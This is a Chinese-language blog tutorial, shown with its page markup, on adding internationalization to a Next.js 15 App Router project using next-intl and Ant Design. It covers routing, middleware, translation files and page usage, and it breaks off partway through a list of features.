            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/26044010879709/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å°‘å¿
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-16T04:00:42.000Z" title="Tue Dec 16 2025 04:00:42 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-16
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    14
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»2åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>æœ¬æ–‡è¯¦ç»†ä»‹ç»å¦‚ä½•åœ¨ Next.js 15 (App Router) ä¸­ä½¿ç”¨ next-intl å®ç°å®Œæ•´çš„å›½é™…åŒ–æ–¹æ¡ˆï¼ŒåŒ…æ‹¬è·¯ç”±å›½é™…åŒ–ã€å†…å®¹ç¿»è¯‘å’Œ UI ç»„ä»¶åº“ï¼ˆAnt Designï¼‰çš„å›½é™…åŒ–ã€‚</p>
<h2 data-id="heading-0">æŠ€æœ¯æ ˆ</h2>
<ul>
<li><strong>Next.js 15</strong> - React æ¡†æ¶</li>
<li><strong>next-intl</strong> - å›½é™…åŒ–åº“</li>
<li><strong>Ant Design</strong> - UI ç»„ä»¶åº“</li>
<li><strong>TypeScript</strong> - ç±»å‹å®‰å…¨</li>
</ul>
<h2 data-id="heading-1">é¡¹ç›®ç»“æ„</h2>
<pre><code class="hljs language-ini" lang="ini">src/
â”œâ”€â”€ app/
â”‚   â””â”€â”€ <span class="hljs-section">[locale]</span>/              <span class="hljs-comment"># åŠ¨æ€è¯­è¨€è·¯ç”±</span>
â”‚       â”œâ”€â”€ layout.tsx         <span class="hljs-comment"># å¸ƒå±€ç»„ä»¶</span>
â”‚       â”œâ”€â”€ page.tsx           <span class="hljs-comment"># é¡µé¢ç»„ä»¶</span>
â”‚       â””â”€â”€ AntdProvider.tsx   <span class="hljs-comment"># Ant Design å›½é™…åŒ–é…ç½®</span>
â”œâ”€â”€ i18n/
â”‚   â”œâ”€â”€ routing.ts             <span class="hljs-comment"># è·¯ç”±é…ç½®</span>
â”‚   â””â”€â”€ request.ts             <span class="hljs-comment"># è¯·æ±‚é…ç½®</span>
â””â”€â”€ middleware.ts              <span class="hljs-comment"># ä¸­é—´ä»¶</span>
messages/
â”œâ”€â”€ en-US.json                 <span class="hljs-comment"># è‹±æ–‡ç¿»è¯‘</span>
â””â”€â”€ zh-CN.json                 <span class="hljs-comment"># ä¸­æ–‡ç¿»è¯‘</span>
</code></pre>
<h2 data-id="heading-2">å®ç°æ­¥éª¤</h2>
<h3 data-id="heading-3">1. å®‰è£…ä¾èµ–</h3>
<pre><code class="hljs language-bash" lang="bash">npm install next-intl
npm install antd @ant-design/nextjs-registry
</code></pre>
<h3 data-id="heading-4">2. é…ç½®è·¯ç”± (<code>src/i18n/routing.ts</code>)</h3>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">import</span> { defineRouting } <span class="hljs-keyword">from</span> <span class="hljs-string">'next-intl/routing'</span>;
<span class="hljs-keyword">import</span> { createNavigation } <span class="hljs-keyword">from</span> <span class="hljs-string">'next-intl/navigation'</span>;

<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> routing = <span class="hljs-title function_">defineRouting</span>({
  <span class="hljs-attr">locales</span>: [<span class="hljs-string">'zh-CN'</span>, <span class="hljs-string">'en-US'</span>],
  <span class="hljs-attr">defaultLocale</span>: <span class="hljs-string">'en-US'</span>,
  <span class="hljs-attr">localePrefix</span>: <span class="hljs-string">'as-needed'</span>  <span class="hljs-comment">// é»˜è®¤è¯­è¨€ä¸æ˜¾ç¤ºå‰ç¼€</span>
});

<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> { <span class="hljs-title class_">Link</span>, redirect, usePathname, useRouter } =
  <span class="hljs-title function_">createNavigation</span>(routing);
</code></pre>
<p><strong>é…ç½®è¯´æ˜ï¼š</strong></p>
<ul>
<li><code>locales</code>: æ”¯æŒçš„è¯­è¨€åˆ—è¡¨</li>
<li><code>defaultLocale</code>: é»˜è®¤è¯­è¨€ï¼ˆè‹±æ–‡ï¼‰</li>
<li><code>localePrefix: 'as-needed'</code>: é»˜è®¤è¯­è¨€ URL ä¸æ˜¾ç¤ºå‰ç¼€</li>
</ul>
<p><strong>URL ç»“æ„ï¼š</strong></p>
<pre><code class="hljs language-bash" lang="bash">/              â†’ è‹±æ–‡é¦–é¡µï¼ˆé»˜è®¤è¯­è¨€ï¼Œæ— å‰ç¼€ï¼‰
/about         â†’ è‹±æ–‡å…³äºé¡µ
/zh-CN         â†’ ä¸­æ–‡é¦–é¡µ
/zh-CN/about   â†’ ä¸­æ–‡å…³äºé¡µ
</code></pre>
<h3 data-id="heading-5">3. é…ç½®ä¸­é—´ä»¶ (<code>src/middleware.ts</code>)</h3>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">import</span> createMiddleware <span class="hljs-keyword">from</span> <span class="hljs-string">'next-intl/middleware'</span>;
<span class="hljs-keyword">import</span> { routing } <span class="hljs-keyword">from</span> <span class="hljs-string">'./i18n/routing'</span>;

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title function_">createMiddleware</span>(routing);

<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> config = {
  <span class="hljs-attr">matcher</span>: [<span class="hljs-string">'/'</span>, <span class="hljs-string">'/(zh-CN|en-US)/:path*'</span>, <span class="hljs-string">'/((?!api|_next|_vercel|.*\\..*).*)'</span>]
};
</code></pre>
<p><strong>ä¸­é—´ä»¶ä½œç”¨ï¼š</strong></p>
<ul>
<li>æ‹¦æˆªæ‰€æœ‰è¯·æ±‚</li>
<li>è‡ªåŠ¨è¯†åˆ«å’Œå¤„ç†è¯­è¨€è·¯ç”±</li>
<li>å°†æ— æ•ˆè¯­è¨€é‡å®šå‘åˆ°é»˜è®¤è¯­è¨€</li>
<li>æ’é™¤ API è·¯ç”±å’Œé™æ€èµ„æº</li>
</ul>
<h3 data-id="heading-6">4. é…ç½®è¯·æ±‚å¤„ç† (<code>src/i18n/request.ts</code>)</h3>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">import</span> { getRequestConfig } <span class="hljs-keyword">from</span> <span class="hljs-string">'next-intl/server'</span>;
<span class="hljs-keyword">import</span> { routing } <span class="hljs-keyword">from</span> <span class="hljs-string">'./routing'</span>;

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title function_">getRequestConfig</span>(<span class="hljs-keyword">async</span> ({ requestLocale }) =&gt; {
  <span class="hljs-keyword">let</span> locale = <span class="hljs-keyword">await</span> requestLocale;

  <span class="hljs-keyword">if</span> (!locale || !routing.<span class="hljs-property">locales</span>.<span class="hljs-title function_">includes</span>(locale <span class="hljs-keyword">as</span> <span class="hljs-built_in">any</span>)) {
    locale = routing.<span class="hljs-property">defaultLocale</span>;
  }

  <span class="hljs-keyword">return</span> {
    locale,
    <span class="hljs-attr">messages</span>: (<span class="hljs-keyword">await</span> <span class="hljs-keyword">import</span>(<span class="hljs-string">`../../messages/<span class="hljs-subst">${locale}</span>.json`</span>)).<span class="hljs-property">default</span>
  };
});
</code></pre>
<p><strong>åŠŸèƒ½ï¼š</strong></p>
<ul>
<li>éªŒè¯è¯·æ±‚çš„è¯­è¨€æ˜¯å¦åˆæ³•</li>
<li>åŠ¨æ€å¯¼å…¥å¯¹åº”çš„ç¿»è¯‘æ–‡ä»¶</li>
<li>ä¸åˆæ³•æ—¶å›é€€åˆ°é»˜è®¤è¯­è¨€</li>
</ul>
<h3 data-id="heading-7">5. é…ç½® Next.js (<code>next.config.ts</code>)</h3>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">import</span> createNextIntlPlugin <span class="hljs-keyword">from</span> <span class="hljs-string">'next-intl/plugin'</span>;

<span class="hljs-keyword">const</span> withNextIntl = <span class="hljs-title function_">createNextIntlPlugin</span>(<span class="hljs-string">'./src/i18n/request.ts'</span>);

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title function_">withNextIntl</span>({
  <span class="hljs-comment">// å…¶ä»– Next.js é…ç½®</span>
});
</code></pre>
<h3 data-id="heading-8">6. åˆ›å»ºå¸ƒå±€ç»„ä»¶ (<code>src/app/[locale]/layout.tsx</code>)</h3>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">import</span> <span class="hljs-keyword">type</span> { <span class="hljs-title class_">Metadata</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">"next"</span>;
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">NextIntlClientProvider</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'next-intl'</span>;
<span class="hljs-keyword">import</span> { getMessages } <span class="hljs-keyword">from</span> <span class="hljs-string">'next-intl/server'</span>;
<span class="hljs-keyword">import</span> { notFound } <span class="hljs-keyword">from</span> <span class="hljs-string">'next/navigation'</span>;
<span class="hljs-keyword">import</span> { routing } <span class="hljs-keyword">from</span> <span class="hljs-string">'@/i18n/routing'</span>;
<span class="hljs-keyword">import</span> <span class="hljs-title class_">AntdProvider</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'./AntdProvider'</span>;
<span class="hljs-keyword">import</span> <span class="hljs-string">"./globals.css"</span>;

<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-attr">metadata</span>: <span class="hljs-title class_">Metadata</span> = {
  <span class="hljs-attr">title</span>: <span class="hljs-string">"Mogotech Web"</span>,
  <span class="hljs-attr">description</span>: <span class="hljs-string">"Next.js project with i18n support"</span>,
};

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">LocaleLayout</span>(<span class="hljs-params">{
  children,
  params
}: {
  children: React.ReactNode;
  params: <span class="hljs-built_in">Promise</span>&lt;{ locale: <span class="hljs-built_in">string</span> }&gt;;
}</span>) {
  <span class="hljs-keyword">const</span> { locale } = <span class="hljs-keyword">await</span> params;

  <span class="hljs-comment">// éªŒè¯è¯­è¨€å‚æ•°</span>
  <span class="hljs-keyword">if</span> (!routing.<span class="hljs-property">locales</span>.<span class="hljs-title function_">includes</span>(locale <span class="hljs-keyword">as</span> <span class="hljs-built_in">any</span>)) {
    <span class="hljs-title function_">notFound</span>();
  }

  <span class="hljs-comment">// è·å–ç¿»è¯‘æ¶ˆæ¯</span>
  <span class="hljs-keyword">const</span> messages = <span class="hljs-keyword">await</span> <span class="hljs-title function_">getMessages</span>();

  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">{locale}</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">NextIntlClientProvider</span> <span class="hljs-attr">messages</span>=<span class="hljs-string">{messages}</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">AntdProvider</span> <span class="hljs-attr">locale</span>=<span class="hljs-string">{locale}</span>&gt;</span>
            {children}
          <span class="hljs-tag">&lt;/<span class="hljs-name">AntdProvider</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">NextIntlClientProvider</span>&gt;</span>
      <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></span>
  );
}
</code></pre>
<p><strong>å…³é”®ç‚¹ï¼š</strong></p>
<ul>
<li>ä½¿ç”¨ <code>[locale]</code> åŠ¨æ€è·¯ç”±æ•è·è¯­è¨€å‚æ•°</li>
<li>éªŒè¯è¯­è¨€åˆæ³•æ€§ï¼Œä¸åˆæ³•è¿”å› 404</li>
<li><code>NextIntlClientProvider</code> æä¾›ç¿»è¯‘ä¸Šä¸‹æ–‡</li>
<li><code>AntdProvider</code> é…ç½® Ant Design å›½é™…åŒ–</li>
</ul>
<h3 data-id="heading-9">7. é…ç½® Ant Design å›½é™…åŒ– (<code>src/app/[locale]/AntdProvider.tsx</code>)</h3>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-string">'use client'</span>;

<span class="hljs-keyword">import</span> { <span class="hljs-title class_">ConfigProvider</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'antd'</span>;
<span class="hljs-keyword">import</span> zhCN <span class="hljs-keyword">from</span> <span class="hljs-string">'antd/locale/zh_CN'</span>;
<span class="hljs-keyword">import</span> enUS <span class="hljs-keyword">from</span> <span class="hljs-string">'antd/locale/en_US'</span>;

<span class="hljs-keyword">const</span> <span class="hljs-attr">locales</span>: <span class="hljs-title class_">Record</span>&lt;<span class="hljs-built_in">string</span>, <span class="hljs-built_in">any</span>&gt; = {
  <span class="hljs-string">'zh-CN'</span>: zhCN,
  <span class="hljs-string">'en-US'</span>: enUS,
};

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">AntdProvider</span>(<span class="hljs-params">{
  children,
  locale,
}: {
  children: React.ReactNode;
  locale: <span class="hljs-built_in">string</span>;
}</span>) {
  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">ConfigProvider</span> <span class="hljs-attr">locale</span>=<span class="hljs-string">{locales[locale]</span> || <span class="hljs-attr">enUS</span>}&gt;</span>
      {children}
    <span class="hljs-tag">&lt;/<span class="hljs-name">ConfigProvider</span>&gt;</span></span>
  );
}
</code></pre>
<p><strong>ä½œç”¨ï¼š</strong></p>
<ul>
<li>é…ç½® Ant Design ç»„ä»¶çš„è¯­è¨€</li>
<li>å½±å“æ—¥æœŸé€‰æ‹©å™¨ã€è¡¨å•éªŒè¯ã€åˆ†é¡µç­‰ç»„ä»¶çš„æ–‡æœ¬</li>
</ul>
<h3 data-id="heading-10">8. åˆ›å»ºç¿»è¯‘æ–‡ä»¶</h3>
<p><strong>è‹±æ–‡ç¿»è¯‘ (<code>messages/en-US.json</code>)ï¼š</strong></p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"common"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"welcome"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"Welcome"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"home"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"Home"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"about"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"About"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"contact"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"Contact Us"</span>
  <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"home"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"title"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"Welcome to Mogotech"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"description"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"This is a Next.js project with internationalization support"</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<p><strong>ä¸­æ–‡ç¿»è¯‘ (<code>messages/zh-CN.json</code>)ï¼š</strong></p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"common"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"welcome"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"æ¬¢è¿"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"home"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"é¦–é¡µ"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"about"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"å…³äº"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"contact"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"è”ç³»æˆ‘ä»¬"</span>
  <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"home"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"title"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"æ¬¢è¿æ¥åˆ° Mogotech"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"description"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"è¿™æ˜¯ä¸€ä¸ªæ”¯æŒå›½é™…åŒ–çš„ Next.js é¡¹ç›®"</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<p><strong>ç»„ç»‡æ–¹å¼ï¼š</strong></p>
<ul>
<li>ä½¿ç”¨å‘½åç©ºé—´ï¼ˆ<code>common</code>ã€<code>home</code>ï¼‰ç»„ç»‡ç¿»è¯‘</li>
<li>æ”¯æŒåµŒå¥—ç»“æ„</li>
<li>JSON æ ¼å¼ï¼Œæ˜“äºç»´æŠ¤</li>
</ul>
<h3 data-id="heading-11">9. åœ¨é¡µé¢ä¸­ä½¿ç”¨ (<code>src/app/[locale]/page.tsx</code>)</h3>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">import</span> { useTranslations } <span class="hljs-keyword">from</span> <span class="hljs-string">'next-intl'</span>;
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">Link</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'@/i18n/routing'</span>;
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">Button</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'antd'</span>;

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">Home</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> t = <span class="hljs-title function_">useTranslations</span>(<span class="hljs-string">'home'</span>);
  <span class="hljs-keyword">const</span> tc = <span class="hljs-title function_">useTranslations</span>(<span class="hljs-string">'common'</span>);

  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"min-h-screen p-8"</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">nav</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"mb-8 flex gap-4"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">Link</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"/"</span> <span class="hljs-attr">locale</span>=<span class="hljs-string">"zh-CN"</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">Button</span>&gt;</span>ä¸­æ–‡<span class="hljs-tag">&lt;/<span class="hljs-name">Button</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">Link</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">Link</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"/"</span> <span class="hljs-attr">locale</span>=<span class="hljs-string">"en-US"</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">Button</span>&gt;</span>English<span class="hljs-tag">&lt;/<span class="hljs-name">Button</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">Link</span>&gt;</span>
      <span class="hljs-tag">&lt;/<span class="hljs-name">nav</span>&gt;</span>
      
      <span class="hljs-tag">&lt;<span class="hljs-name">main</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"max-w-4xl mx-auto"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">h1</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"text-4xl font-bold mb-4"</span>&gt;</span>{t('title')}<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"text-lg text-gray-600 mb-8"</span>&gt;</span>{t('description')}<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
        
        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"flex gap-4"</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">Button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"primary"</span>&gt;</span>{tc('home')}<span class="hljs-tag">&lt;/<span class="hljs-name">Button</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">Button</span>&gt;</span>{tc('about')}<span class="hljs-tag">&lt;/<span class="hljs-name">Button</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">Button</span>&gt;</span>{tc('contact')}<span class="hljs-tag">&lt;/<span class="hljs-name">Button</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
      <span class="hljs-tag">&lt;/<span class="hljs-name">main</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
  );
}
</code></pre>
<p><strong>ä½¿ç”¨æ–¹å¼ï¼š</strong></p>
<ul>
<li><code>useTranslations('namespace')</code>: è·å–æŒ‡å®šå‘½åç©ºé—´çš„ç¿»è¯‘å‡½æ•°</li>
<li><code>t('key')</code>: è·å–ç¿»è¯‘æ–‡æœ¬</li>
<li><code>Link</code> ç»„ä»¶: ä½¿ç”¨å›½é™…åŒ–è·¯ç”±ï¼Œè‡ªåŠ¨å¤„ç†è¯­è¨€å‰ç¼€</li>
</ul>
<h2 data-id="heading-12">å·¥ä½œæµç¨‹</h2>
<pre><code class="hljs language-bash" lang="bash">ç”¨æˆ·è®¿é—® /about
    â†“
middleware.ts æ‹¦æˆªè¯·æ±‚
    â†“
è¯†åˆ«è¯­è¨€ä¸º en-USï¼ˆé»˜è®¤ï¼‰
    â†“
request.ts åŠ è½½ messages/en-US.json
    â†“
layout.tsx æ¥æ”¶ locale å’Œ messages
    â†“
NextIntlClientProvider æä¾›ç¿»è¯‘ä¸Šä¸‹æ–‡
    â†“
AntdProvider é…ç½® Ant Design è¯­è¨€
    â†“
page.tsx ä½¿ç”¨ useTranslations è·å–ç¿»è¯‘
    â†“
æ¸²æŸ“è‹±æ–‡å†…å®¹
</code></pre>
<h2 data-id="heading-13">è¯­è¨€åˆ‡æ¢æµç¨‹</h2>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// ç”¨æˆ·ç‚¹å‡»è¯­è¨€åˆ‡æ¢æŒ‰é’®</span>
&lt;<span class="hljs-title class_">Link</span> href=<span class="hljs-string">"/"</span> locale=<span class="hljs-string">"zh-CN"</span>&gt;ä¸­æ–‡&lt;/<span class="hljs-title class_">Link</span>&gt;

<span class="hljs-comment">// Link ç»„ä»¶ç”Ÿæˆ URL: /zh-CN</span>
<span class="hljs-comment">// é¡µé¢è·³è½¬åˆ° /zh-CN</span>
<span class="hljs-comment">// middleware è¯†åˆ«è¯­è¨€ä¸º zh-CN</span>
<span class="hljs-comment">// åŠ è½½ messages/zh-CN.json</span>
<span class="hljs-comment">// é‡æ–°æ¸²æŸ“é¡µé¢ï¼Œæ˜¾ç¤ºä¸­æ–‡å†…å®¹</span>
</code></pre>
<h2 data-id="heading-14">æ ¸å¿ƒç‰¹æ€§</h2>
<h3 data-id="heading-15">1. è·¯ç”±å›½é™…åŒ–</h3>
<ul>
<li>URL åŒ…å«è¯­è¨€ä¿¡æ¯ï¼ŒSEO å‹å¥½</li>
<li>é»˜è®¤è¯­è¨€æ— å‰ç¼€ï¼ŒURL ç®€æ´</li>
<li>æ”¯æŒè¯­è¨€åˆ‡æ¢æ—¶ä¿æŒå½“å‰è·¯å¾„</li>
</ul>
<h3 data-id="heading-16">2. æœåŠ¡ç«¯æ¸²æŸ“</h3>
<ul>
<li>ç¿»è¯‘åœ¨æœåŠ¡ç«¯å®Œæˆ</li>
<li>é¦–å±åŠ è½½å³æ˜¾ç¤ºæ­£ç¡®è¯­è¨€</li>
<li>æœ‰åˆ©äº SEO</li>
</ul>
<h3 data-id="heading-17">3. æŒ‰éœ€åŠ è½½</h3>
<ul>
<li>ç¿»è¯‘æ–‡ä»¶åŠ¨æ€å¯¼å…¥</li>
<li>å‡å°‘åˆå§‹åŒ…ä½“ç§¯</li>
<li>æå‡åŠ è½½æ€§èƒ½</li>
</ul>
<h3 data-id="heading-18">4. ç±»å‹å®‰å…¨</h3>
<ul>
